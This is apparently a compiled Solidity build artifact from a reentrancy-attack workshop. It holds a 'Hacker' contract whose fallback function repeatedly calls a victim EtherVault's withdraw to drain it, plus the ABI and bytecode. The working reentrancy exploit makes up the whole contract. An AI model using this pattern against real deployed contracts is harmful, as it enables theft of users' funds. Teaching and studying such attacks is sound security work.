{
  "contractName": "Hacker",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "count",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "victim",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "name": "_victim",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "deposit",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "fund",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516020806104048339810180604052602081101561003057600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610373806100916000396000f3fe608060405260043610610078576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806306661abd146100945780633ccfd60b146100bf578063930c2003146100d65780639e5faafc1461012d578063b60d428814610137578063d0e30db014610141575b600160008154809291906001019190505550610092610158565b005b3480156100a057600080fd5b506100a961020a565b6040518082815260200191505060405180910390f35b3480156100cb57600080fd5b506100d4610210565b005b3480156100e257600080fd5b506100eb61028f565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b610135610158565b005b61013f6102b4565b005b34801561014d57600080fd5b506101566102b6565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d670de0b6b3a76400006040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b1580156101f057600080fd5b505af1158015610204573d6000803e3d6000fd5b50505050565b60015481565b3373ffffffffffffffffffffffffffffffffffffffff163073ffffffffffffffffffffffffffffffffffffffff163160405180600001905060006040518083038185875af1925050503d8060008114610285576040519150601f19603f3d011682016040523d82523d6000602084013e61028a565b606091505b505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16670de0b6b3a764000060405180600001905060006040518083038185875af1925050503d806000811461033d576040519150601f19603f3d011682016040523d82523d6000602084013e610342565b606091505b50505056fea165627a7a723058200df4987d4f4de89cd9c3dd585f48e03549696a33bc501855813441cf24a10b130029",
  "source": "pragma solidity 0.5.0;\nimport \"./EtherVault.sol\";\n\ncontract Hacker {\n    EtherVault public victim;\n    uint256 public count;\n\n    constructor(address payable _victim) public {\n      victim = EtherVault(_victim);\n    }\n\n    function attack() public payable {\n        victim.withdraw(1 ether);\n    }\n\n    function deposit() public {\n        address(victim).call.value(1 ether)(\"\");\n    }\n\n    function fund() public payable {}\n\n    function withdraw() public {\n        msg.sender.call.value(address(this).balance)(\"\");\n    }\n\n    function() external payable {\n        count++;\n        attack();\n    }\n}\n",
  "sourcePath": "/Users/ernestognw/Documents/Blockdemy/workshops/reentrancy-attack/contracts/Hacker.sol",
  "compiler": {
    "name": "solc",
    "version": "0.5.0+commit.1d4f565a.Emscripten.clang"
  },
  "schemaVersion": "3.3.2",
  "updatedAt": "2020-11-06T22:47:42.559Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}